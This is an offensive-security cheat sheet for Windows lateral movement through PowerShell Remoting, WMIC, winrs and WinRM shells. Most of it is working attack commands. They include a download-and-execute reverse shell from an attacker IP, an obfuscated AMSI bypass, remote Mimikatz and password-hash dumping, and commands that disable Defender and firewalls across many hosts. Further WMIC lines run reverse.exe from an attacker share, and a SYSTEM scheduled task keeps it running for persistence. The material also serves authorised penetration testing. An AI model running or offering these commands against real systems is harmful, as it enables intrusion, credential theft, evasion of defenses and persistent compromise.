# Powershell Remoting

## Permissions: Administrator OR user in Remote Management Users group

## Requirements: WinRM (port 5985/5986) open

## Use case: You want modern, interactive access to a remote system (preferred for clean environments). Use it with valid credentials.

## Ways to use:

 - One-to-One

 - Interactive

 - Stateful

 - Executes in a new process (wsmprovhost)

 - Execute command on multiple systems at once

 - Runs background jobs

 - -Credential parameter can be used to pass credentials

## Create a session

##### Enable PowerShell Remoting on local system (Requires elevated privileges)

    Enable-PSRemoting

##### Create new PSSession

    New-PSSession -Computer Srv01.Security.local

##### Connect to PSSession

    Enter-PSSession -Computer Srv01.Security.local

##### Connect to PSSession with a trusted remote account

    Enter-PSSession -ComputerName IP/FQDN -Credential Administrator

##### Store session as variable

    $Session = New-PSSession -Computer Srv01.Security.local

### If you have sessions stored as variables then commands with the -Computername parameter can be replaced with -Session $session.

## Run commands on target

    Invoke-Command -Computername Srv01.Security.local -ScriptBlock {Whoami;Hostname}
    Invoke-Command -Computername Srv01.Security.local -FilePath 'C:\Tools\Invoke-Mimikatz.ps1'

##### Run locally loaded functions on target system

    Invoke-Command -Computername Srv01.Security.local -ScriptBlock ${Function:Test-Function}

##### Load script into remote session

    Invoke-Command -FilePath 'C:\Tools\Invoke-Mimikatz.ps1' -Session $Session

##### Reverse shell

    Invoke-Command -ComputerName Srv01.Security.local -ScriptBlock {cmd /c "powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://<IP>/Shell.ps1')"}

##### Bypass AMSI

    Invoke-Command -session $Session -scriptblock {sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )}

## Run commands on multiple systems

##### Execute commands on multiple systems

    Invoke-Command –Scriptblock {Get-Process} -ComputerName (Get-Content c:\Serverlist.txt) 

##### Execute scripts on multiple systems

    Invoke-Command –FilePath C:\scripts\Get-PassHashes.ps1 -ComputerName (Get-Content c:\Serverlist.txt)

##### Execute functions on multiple systems

    Invoke-Command -ScriptBlock ${function:Get-PassHashes} -ComputerName (Get-Content c:\Serverlist.txt)

##### Bypass AMSI on multiple systems

    Invoke-Command -Scriptblock {sET-ItEM ( 'V'+'aR' +  'IA' + 'blE:1q2'  + 'uZx'  ) ( [TYpE](  "{1}{0}"-F'F','rE'  ) )  ;    (    GeT-VariaBle  ( "1Q2U"  +"zX"  )  -VaL  )."A`ss`Embly"."GET`TY`Pe"((  "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System'  ) )."g`etf`iElD"(  ( "{0}{2}{1}" -f'amsi','d','InitFaile'  ),(  "{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,'  ))."sE`T`VaLUE"(  ${n`ULl},${t`RuE} )} -ComputerName (Get-Content c:\Serverlist.txt)

## Disable Defenses

##### Turns off Defender, sets an exclusion path

    Invoke-Command -ComputerName Srv02.Security.local -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true;` Set-MpPreference -DisableIOAVProtection $true;` Set-MPPreference -DisableBehaviorMonitoring $true;` Set-MPPreference -DisableBlockAtFirstSeen $true;` Set-MPPreference -DisableEmailScanning $true;` Set-MPPReference -DisableScriptScanning $true;` Set-MpPreference -DisableIOAVProtection $true;` Add-MpPreference -ExclusionPath "C:\Windows\Temp";`}

##### Turns off all firewall profiles

    Invoke-Command -ComputerName Srv02.Security.local -ScriptBlock {Set-NetFirewallProfile -Profile "Domain","Public","Private" -Enabled "False"}

##### Turns off Defender and Firewall on multiple systems

    Invoke-Command -ScriptBlock {Set-MpPreference -DisableRealtimeMonitoring $true;` Set-MpPreference -DisableIOAVProtection $true;` Set-MPPreference -DisableBehaviorMonitoring $true;` Set-MPPreference -DisableBlockAtFirstSeen $true;` Set-MPPreference -DisableEmailScanning $true;` Set-MPPReference -DisableScriptScanning $true;` Set-MpPreference -DisableIOAVProtection $true;` Add-MpPreference -ExclusionPath "C:\Windows\Temp";` Set-NetFirewallProfile -Profile "Domain","Public","Private" -Enabled "False"}` -ComputerName (Get-Content c:\Serverlist.txt)

# Wmic

##### Execute calc.exe on remote system

    wmic /node:10.10.10.5 /user:moe process call create "cmd.exe /c calc.exe"

##### Executing reverse shell on remote system from a SMB share hosted on attackers system

    wmic /node:10.10.10.5 /user:moe process call create "cmd.exe /c \\10.10.10.200\Share\reverse.exe"

##### Setting up persistence with schtasks on a remote system to execute a reverse shell every minute/

    wmic /node:10.10.10.5 /user:moe process call create "schtasks /create /sc minute /mo 1 /tn "Persistence" /tr \\10.10.10.200\Share\reverse.exe /ru "SYSTEM""

# Winrs

##### Connect remotely to system and execute a command

    winrs -r:IP/FQDN -u:workstation\administrator -p:Password@987 COMMAND

##### Get an interactive shell

    winrs -r:IP/FQDN -u:workstation\administrator -p:Password@987 CMD

# Get a remote shell using Docker

    docker run -it quickbreach/powershell-ntlm

Then, in the session, run

    $creds = Get-Credential (Enter credentials)

Connect to a remote session

    Enter-PSSession -ComputerName IP/FQDN -Authentication Negotiate -Credential $creds

# Get a remote shell using Ruby Script

Link: https://raw.githubusercontent.com/Alamot/codesnippets/master/winrm/winrm_shell_with_upload.rb

Modify the script by giving a valid username, password and endpoint.

Once modified, run it with ruby

    ruby winrm_shell_with_upload.rb
